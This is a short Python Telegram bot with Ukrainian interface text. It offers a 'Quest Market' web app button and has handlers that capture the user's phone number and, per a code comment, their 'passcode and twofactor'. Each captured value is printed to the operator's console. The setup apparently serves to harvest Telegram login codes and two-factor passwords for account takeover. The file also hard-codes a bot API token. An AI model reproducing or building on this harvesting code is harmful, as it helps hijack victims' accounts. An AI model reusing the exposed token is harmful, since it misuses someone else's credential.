import telebot
import json
from telebot import types

TOKEN = "8501545065:AAGgYCuf0tOj-uc74hE9YlDJJJHojbKztrA"
WEBAPP_URL = "https://fairusss.github.io/tgbot/"

bot = telebot.TeleBot(TOKEN)
# /start — показує кнопку з WebApp
@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton(
            text="Відкрити WebApp",
            web_app=types.WebAppInfo(url=WEBAPP_URL)
        )
    )
    bot.send_message(
        message.chat.id,
        "Привіт! Натисни, щоб відкрити Quest Market:",
        reply_markup=markup
    )

# Отримання номера телефону з WebApp
@bot.message_handler(content_types=['contact'])
def handle_webapp_data(message):
    data = message.contact.phone_number

    print(data)
    bot.send_message(message.chat.id, f"Отримано номер: {data}")

# get passcode and twofactor from webapp
@bot.message_handler(content_types=['web_app_data'])
def handle_webapp(message):
    data = message.web_app_data.data
    print(data)
    bot.send_message(message.chat.id, f"Отримано passcode: {data}")

print("Бот запущено! Очікуємо дані...")



bot.infinity_polling()  